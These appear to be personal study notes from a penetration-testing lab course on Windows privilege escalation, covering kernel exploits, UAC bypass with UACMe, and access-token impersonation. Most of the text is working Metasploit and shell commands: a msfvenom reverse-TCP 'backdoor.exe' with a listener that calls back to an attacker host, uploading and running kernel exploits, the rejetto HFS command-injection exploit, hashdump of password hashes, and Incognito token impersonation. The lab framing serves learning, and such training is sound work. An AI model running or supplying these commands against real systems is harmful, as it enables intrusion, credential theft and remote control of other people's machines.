#### automation
-> _PrivescCheck_ : Github tool to automate check for priv esc vectors
	-> https://github.com/itm4n/PrivescCheck 
	
----
##### psexec (SMB Login)

-> In case of having a valid set of _Credentials_
-> use `psexec` to connect with the target machine and get shell
-> either through _MSF Module_ or _github binary_

---
-> `net localgroup GROUPNAME` : to see which users comes under this group 

# 1 Kernel Exploits
-> Windows NT is the default kernel in windows
###### Steps :
-> Identifying Kernel vulnerability (according to the version of window) 
-> Downloading , compiling & transferring the exploit on the target machines.

#### MSF
-> `getsystem` : meterpreter command which tried to get escalated privileges automatically by using some common PrivEsc vectors.

-> */multi/recon/local_exploit_suggester* : MSF Module to know which kernel expliot is usefull to execute 

assuming we have the access of user account in meterpreter*
```msf
sessions
meterpreter> getprivs
meterpreter> getsystem

msf> search suggester
use 0
set SESSION
run

use exploit/windows/local/ms1 6_014_wmi_recv_notif
set SESSION
SET LPORT 4444
run
meterpreter> getuid
```
`getpric`: To check the amount of privileges.
`getsystem`: Is an inbult meterpreter command that allows you to automatically elevate the privileges on target system.
`suggester`: This will enumerate you all the vulnerabilities within the particular version.
Further it will display the `metasploit` modules to elevate your privileges.

### Manual Prevesc
#### Tools 
1. Windows-Exploit-Suggester
	-> https://github.com/AonCyberLabs/Windows-Exploit-Suggester
```msf
meterpreter> shell
> systeminfo
copy the all the information
ctrl+c
```
```linux
cd Desktop
nano win7.txt and paste the content
cd to Windows-Exploit-Suggester
(cloned from github)

./windows-exploit-suggester.py --update

	./windows-exploit-suggester.py --database <file_name-generated> --systeminfo ~/Desktop/win7.txt
```
> [!NOTE]
> In the output
> [E] exploitdb PoC,
> [M] Metasploit module,
> [*] missing bulletin
2. Windows-Kernel-Exploits
	-> https://github.com/SecWiki/windows-kernel-exploits
	-> collection of windows kernel exploits sorted by CVE.
	using `MS16-135 x64 Universal`>`41015.exe
	Download the .exe file
Uploading the .exe to the target machine.
```
meterpreter> cd Temp\\
> ls
> upload ~Downloads/41015.exe
> shell
> dir
> 41015.exe
to get run menue
> 41015.exe 7
choosing the windows version
> whoami
```

----

# 2 Bypassing UAC With UACMe
`UAC` : User Access Control.
###### Needs #important 
-> need to have a user account , that must be the part of a local administrator group
	`net localgroup GROUPNAME`
-> need to know the UAC level , high , medium or low.
#### Tool
`UACMe` : https://github.com/hfiref0x/UACME
###### using MSF
-> `/exploit/windows/local/bypassuac_injection`
-> `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
-> `set TARGET Windows\ x64`  : tab can help in auto completion

```linux
nmap 10.2.22.220
(chek port 80|website)

service postgresql start && msfconsole
```
```msf
setg RHOSTS 10.2.22.220
search rejetto
use 0
run
```
```meterpreter
> sysinfo
> pgerp explorer
> migrate 2448
> 
> sysinfo
> getuid
> getprivs
> shell
	> net user
	> net localgroup administrator
```
`pgerp explorer`: its a service runnung on windows | greping it.
we will have to bypass the UAC
Eg.	> net user admin password123 
(trying to change the user password | but got error "Access Denied")

### Using UACMe
Github Tool.
#### Methodology 
1. generate own payload using MSFVENOM
```linux
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT 1234 -f exe > backdoor.exe
```
`-p`: payload
`-f`: output file format
2. Setup the /multi/handler listener on MSF
```msf
msfconsole
search multi/handler
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST & LPORT
run
```
3. transfer the `akagai64.exe` & `paylaod` on windows machine. (old msf tab)
```old_msf
cd C:\\
mkdir temp
cd temp
upload backdoor.exe
upload <path/to/Akagi64.exe
shell
```
5. run the `akagain64.exe` [ key ]  [ payload to execute ]
```old_msf
.\akagain64.exe 23 C:\\temp\backdoor.exe
```
-> these keys are based on the windows version running on the machines and a proper description is given on  `github`
After step `5` executed successfully the `new meterpreter session` created on the listner.
```new_msf
getuid
getprivs
ps
->Eg.
migrate 688
sysinfo
getuid
hashdump
```

----
# 3 Access Token Impersonation
-> access token are generate by `winlogon.exe`
when user logged in successfully.
`LSAS`: Local security authoriy subsystem.
###### needs
1. need to have an elevated account or a low privileged account that have an 
	-> _SeimpersonatePrivilege_ permission
2. A foothold on system

3. Impersonate-level token : created as a direct result of non-interactive login 
4. Delegate-level token : created through an interactive session like RDP etc.

###### Privs
1. SeAssignPrimaryToken : This allows user to impersonate token
2. SeCreateToken : This allows a user to create an arbitrary token with administrative privileges.
3. *SeImpersonatePrivilege* : This allows a user to create a process under the security context of another user typically with administrative privileges.

###### Tools
-> rejetto : MSF exploit module -- exploit for *HttpFileServer httpd 2.3*
-> `Incognito` : MSF plugin module to impersonate tokens 

### Steps
1. use `hfs` , to get do a command injection attack on `HttpFileServer` 
2. set options and exploit , get a meterpreter shell
```
nmap 10.2.24.20
service postgresql start && msfconsole
```
```msf
search hfs
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS
run
```

3. check , if we have `SeImpersonatePrivilege` perms
	-> migrating 32 bit meterpreter session to different session
```meterpreter
> pgrep explorer
> migrate <PID>
(Access denied)
> getuid
> getprivs
:SeImppersonatePrivilege
```
utilising this meterpreter session (user account) to impersonate other access token available.
#### Using Incognito Module:
4. after that , `load incognito` .
5. `list_tokens -u` : to list user accounts access tokens
6. copy the name of the access_token and run
7. `impersonate_token "NAME"`
8. migrate to a different service : `migrate PID` : might be explorer.exe
```meterpreter
> load incognito
> list_tokens -u
copy the name of Access token
```
`-u`: user
```meterpreter
impersonate_token "ATTACKDEFENSE Administrator"
getuid
getprivs (access denied)

pgrep explorer
migrate <PID>
getprivs

cat C:\\Users\\Administrator\\Desktop\\flag.txt
```
If not found any privileged access token, neither `Deligation` token nor `Impersonation` token
	In that case we will use #Potato_Attack
